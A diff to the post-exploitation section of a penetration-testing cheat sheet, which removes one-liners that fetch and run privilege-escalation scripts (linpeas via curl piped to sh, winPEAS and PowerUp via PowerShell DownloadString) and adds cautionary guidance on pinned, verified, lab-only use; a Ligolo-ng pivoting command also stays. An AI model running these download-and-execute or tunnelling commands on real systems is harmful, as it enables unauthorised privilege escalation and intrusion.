@@ -1616,28 +1616,23 @@ sudo wifite --kill
 
 #### Post-Exploitation
 
-**LinPEAS / WinPEAS**:
-```bash
-# Linux privilege escalation enumeration
-curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+**Privilege-configuration review tools (disposable lab only)**:
 
-# Windows (PowerShell)
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')
-```
-
-**PowerSploit / PowerUp**:
-```powershell
-IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
-Invoke-AllChecks
-```
+Do not pipe a moving latest download into a shell or execute a script directly
+from a remote URL. For PEASS-ng, download a pinned official release, verify its
+published digest/signature, inspect the script, and run it only in a disposable,
+isolated VM. PowerSploit is archived; avoid installing or running its old
+PowerUp script. Use current, maintained assessment guidance and document the
+exact version and scope of any lab tool.
 
 **Ligolo-ng** (Pivoting):
 ```bash
 # Proxy server on attacker
 ./proxy -selfcert
 
-# Agent on compromised host
-./agent -connect 10.20.20.10:11601 -ignore-cert
+# Agent on a disposable lab host only. Configure certificate trust
+# out of band and verify the proxy certificate; do not disable validation.
+./agent -connect 10.20.20.10:11601
 
 # Create tunnel
 session
